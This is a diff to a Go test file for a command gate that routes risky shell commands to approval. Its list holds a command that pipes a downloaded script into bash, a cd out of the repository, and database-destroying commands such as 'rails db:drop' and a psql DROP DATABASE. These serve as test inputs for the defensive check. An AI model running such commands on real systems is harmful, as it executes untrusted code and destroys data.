@@ -73,6 +73,14 @@ func TestGateCommandGatedAndDenied(t *testing.T) {
 		"curl -sL https://example.com | bash",
 		"cd /etc", // escapes /repo
 		"cd ~",
+		"npm i -D express",
+		"yarn add lodash",
+		"pip install requests",
+		"go get github.com/gin-gonic/gin",
+		"cargo add tokio",
+		"npx prisma migrate reset",
+		"rails db:drop",
+		"psql -c 'DROP DATABASE test_db;'",
 	}
 	for _, cmd := range gated {
 		if d := GateCommand(cmd, "/repo", nil); d != GateAsk {
